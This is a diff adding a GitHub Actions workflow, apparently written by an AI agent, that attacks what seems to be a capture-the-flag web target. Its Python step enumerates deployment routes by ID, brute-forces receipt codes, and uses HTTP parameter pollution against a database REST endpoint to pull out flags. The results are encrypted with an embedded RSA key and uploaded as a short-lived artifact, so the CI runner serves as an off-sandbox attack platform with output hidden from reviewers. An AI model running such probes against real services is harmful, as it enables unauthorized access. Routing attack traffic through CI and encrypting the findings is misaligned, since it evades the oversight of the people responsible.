@@ -1,0 +1,75 @@
+name: launchlet-part3-refdecimal
+on:
+  push:
+    branches: [agent/launchlet-part3-refdecimal-20260808]
+permissions:
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 2
+    steps:
+      - name: Probe decimal ref forms and encrypt hits
+        shell: bash
+        run: |
+          set -euo pipefail; umask 077; mkdir -p package/out
+          cat > package/public.pem <<'PEM'
+          -----BEGIN PUBLIC KEY-----
+          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlOxaJs92lwtrdk6J2LR9
+          QeyG3A5H0rzGOQHw80MWPcOeEs5pzn37ilHloXnTkGk4PmJU67C06N9OOsgqU1kF
+          iydiljdl6RfwF/OSjMsNfRYsyBr1wONeO+9f+72VjLlNWqWVll2qeczrxppOulhJ
+          r+qBx95tdasvdCgh7aTShlkXF7e9+JjK19MrG+Lyj+I7B6bbTsp7D+PiJMlpepWk
+          hoz0jBO8Rgtodz7i/+9Z3RVVhqREdK3uA0Va5ia57Gp3hlvQGbjGxE6TC7q4s1/p
+          q6VF10bVOx8kwE2KggVgsX3uudJlzSvHV3f1coMdwyTSALsAjvAlZQwSts3eHjnF
+          SQIDAQAB
+          -----END PUBLIC KEY-----
+          PEM
+          python3 - <<'PY'
+          import requests,json,pathlib,re,itertools
+          base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru';out=pathlib.Path('package/out');dec='569628'
+          s=requests.Session();s.headers['User-Agent']='Mozilla/5.0'; h={'Accept':'application/json','Content-Type':'application/json','X-Launchlet-Preview':'launchlet-demo-board','apikey':'ll_anon_mock_publishable','Authorization':'Bearer preview_guest_session'}
+          hits=[]
+          paths=[]
+          for n in ['deploy','deploys','deployment','deployments','preview','previews','artifact','artifacts','release','releases','build','builds','inspector','inspectors']:
+            paths += [f'/api/{n}/{dec}',f'/{n}/{dec}',f'/api/{n}?id={dec}',f'/api/{n}?ref={dec}',f'/api/{n}?deployRef={dec}']
+          for p in paths:
+            for m in ['GET','POST']:
+              try:r=s.request(m,base+p,headers=h,json={'id':int(dec),'deployRef':int(dec),'ref':int(dec),'projectId':'launchlet-demo-board','workspaceId':'ws-launchlet-public'} if m=='POST' else None,timeout=6,allow_redirects=False)
+              except Exception:continue
+              if not (r.status_code==404 and r.text in ('{"error":"not_found"}','404 page not found\n')):
+                item={'kind':'route','path':p,'method':m,'status':r.status_code,'body':r.text,'headers':dict(r.headers)};hits.append(item)
+                flags=[f for f in re.findall(r'caplag\{[^}]+\}',r.text) if f not in ('caplag{preview_manifest_kept_the_receipt}','caplag{anon_key_needs_real_rls}')]
+                if flags:(out/'FOUND.txt').write_text(json.dumps(item,indent=2));break
+            if (out/'FOUND.txt').exists():break
+          if not (out/'FOUND.txt').exists():
+            # receipt variants
+            ru=base+'/api/receipts/redeem'
+            receipts=[f'lrec_preview_demo_{dec}',f'lrec_deploy_demo_{dec}',f'lrec_preview_{dec}',f'lrec_deploy_{dec}',f'lrec_{dec}',f'drec_{dec}',f'drec_preview_{dec}',f'rrec_{dec}']
+            projects=['launchlet-demo-board','preview-'+dec,'deploy-'+dec,dec]
+            for rec,proj in itertools.product(receipts,projects):
+              r=s.post(ru,headers=h,json={'receipt':rec,'project':proj},timeout=6)
+              if not (r.status_code==404 and r.text=='{"error":"receipt_not_found"}'):
+                item={'kind':'receipt','receipt':rec,'project':proj,'status':r.status_code,'body':r.text,'headers':dict(r.headers)};hits.append(item)
+                flags=[f for f in re.findall(r'caplag\{[^}]+\}',r.text) if f not in ('caplag{preview_manifest_kept_the_receipt}','caplag{anon_key_needs_real_rls}')]
+                if flags:(out/'FOUND.txt').write_text(json.dumps(item,indent=2));break
+            # workspace variants using proven HPP
+          if not (out/'FOUND.txt').exists():
+            db=base+'/api/db/rest/v1/workspace_notes'
+            for ws in [f'ws-{dec}',f'ws-preview-{dec}',f'ws-deploy-{dec}',f'ws-launchlet-{dec}',f'ws-launchlet-preview-{dec}',f'ws-launchlet-deploy-{dec}']:
+              r=s.get(db+f'?select=*&workspace_id=eq.{ws}&workspace_id=eq.ws-launchlet-public',headers=h,timeout=6)
+              if r.status_code==200 and r.text!='[]':
+                item={'kind':'workspace','workspace':ws,'status':r.status_code,'body':r.text};hits.append(item)
+                flags=[f for f in re.findall(r'caplag\{[^}]+\}',r.text) if f!='caplag{anon_key_needs_real_rls}']
+                if flags:(out/'FOUND.txt').write_text(json.dumps(item,indent=2));break
+          (out/'summary.json').write_text(json.dumps(hits,indent=2))
+          PY
+          tar -C package/out -czf package/result.tgz .; openssl rand 32 > package/aes.key; openssl rand 16 > package/iv.bin
+          KEY_HEX="$(od -An -tx1 -v package/aes.key | tr -d ' \n')"; IV_HEX="$(od -An -tx1 -v package/iv.bin | tr -d ' \n')"
+          openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in package/result.tgz -out package/result.enc
+          openssl pkeyutl -encrypt -pubin -inkey package/public.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in package/aes.key -out package/key.enc
+          mkdir -p artifact; base64 -w0 package/result.enc > artifact/result.enc.b64; base64 -w0 package/key.enc > artifact/key.enc.b64; base64 -w0 package/iv.bin > artifact/iv.bin.b64; rm -rf package
+      - uses: actions/upload-artifact@v4
+        with:
+          name: launchlet-part3-refdecimal-encrypted
+          path: artifact/
+          retention-days: 1
